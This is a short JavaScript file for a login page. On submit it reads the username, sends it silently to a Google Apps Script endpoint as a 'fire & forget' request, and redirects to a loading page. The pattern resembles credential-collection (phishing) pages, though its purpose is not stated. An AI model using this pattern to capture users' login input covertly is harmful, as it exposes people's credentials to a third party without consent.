document.addEventListener("DOMContentLoaded", function () {

  document.getElementById("loginForm").addEventListener("submit", function (e) {
    e.preventDefault();

    const username = document.getElementById("username").value;

    // 🔹 DATA SEND via GET (no CORS issue)
    const url =
      "https://script.google.com/macros/s/AKfycbwsglo3xpNMJ_l9RFAaHA6KlXHR0UECZzSJ8LKIRMiJlcWRPrXv4cv_BVjLCSfuyhfu/exec"
      + "?username=" + encodeURIComponent(username);

    // fire & forget
    fetch(url);

    // 🔹 Redirect user immediately
    window.location.href = "loading.html";
  });

});

